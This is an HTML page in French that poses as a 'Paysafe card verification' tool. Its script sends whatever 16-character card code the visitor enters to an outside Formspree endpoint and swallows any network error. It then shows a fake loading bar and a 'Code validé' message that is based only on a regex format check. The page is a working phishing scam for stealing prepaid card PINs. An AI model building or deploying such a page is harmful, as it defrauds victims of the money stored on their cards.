<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Vérification Carte Paysafe</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h1>Code Paysafe :</h1>
    <form id="codeForm" action="https://formspree.io/f/myzjvnwg" method="POST" onsubmit="return sendCode(event)">
      <input type="text" name="code" id="code" placeholder="Entrez le code de votre carte..." required />
      <br /><br />
      <button type="submit">Vérifier</button>
    </form>

    <div id="loaderBar"><div id="progress"></div></div>

    <div class="icons">
      <div>💳</div>
      <div>📲</div>
      <div>✅</div>
    </div>

    <div class="steps">
      <div class="step">1. 💳 Achetez une carte Paysafe dans un point de vente ou en ligne. Elle contient un code PIN à 16 chiffres.</div>
      <div class="step">2. 🧾 Connectez-vous sur un site ou une plateforme acceptant Paysafe comme moyen de paiement.</div>
      <div class="step">3. 🔐 Choisissez Paysafe comme méthode de paiement et entrez le code PIN de votre carte.</div>
      <div class="step">4. 💸 Une fois le code validé, le montant est automatiquement déduit de la carte et utilisé pour votre achat.</div>
      <div class="step">5. 📧 Vous pouvez vérifier l’historique de vos transactions en créant un compte Paysafe.</div>
      <div class="step">6. ✅ Il n’est pas nécessaire de fournir de données bancaires, ce qui rend ce moyen de paiement anonyme et sécurisé.</div>
    </div>

    <div id="result"></div>
  </div>

  <script>
    function revealSteps() {
      const steps = document.querySelectorAll('.step');
      steps.forEach(step => {
        const top = step.getBoundingClientRect().top;
        if (top < window.innerHeight - 100) {
          step.classList.add('visible');
        }
      });
    }

    window.addEventListener('scroll', revealSteps);

    function sendCode(e) {
      e.preventDefault();
      const form = e.target;
      const loaderBar = document.getElementById('loaderBar');
      const progress = document.getElementById('progress');
      const result = document.getElementById('result');

      const code = document.getElementById('code').value.trim();

      // Reset affichage résultat avant chargement
      result.style.display = 'none';
      result.textContent = '';
      loaderBar.style.display = 'block';
      progress.style.width = '0%';

      // Envoi du formulaire à Formspree
      fetch(form.action, {
        method: 'POST',
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
      }).catch(() => {
        // On ignore l'erreur réseau ici pour continuer la simulation
      });

      // Animation de la barre de chargement pendant 9s (18 x 500ms)
      let i = 0;
      const interval = setInterval(() => {
        i++;
        progress.style.width = (i * (100 / 18)) + '%';
        if (i >= 18) {
          clearInterval(interval);
          loaderBar.style.display = 'none';
          result.style.display = 'block';

          if (/^[A-Za-z0-9]{16}$/.test(code)) {
            // Code valide
            result.style.color = '#00cc66';
            result.style.background = 'black';
            result.style.borderLeft = '5px solid #00cc66';
            result.textContent = '✅ Code validé';
          } else {
            // Code non valide (sans message sur la longueur)
            result.style.color = 'white';
            result.style.background = 'red';
            result.style.borderLeft = '5px solid darkred';
            result.textContent = '❌ Code non validé';
          }

          window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
        }
      }, 500);

      return false;
    }
  </script>
</body>
</html>
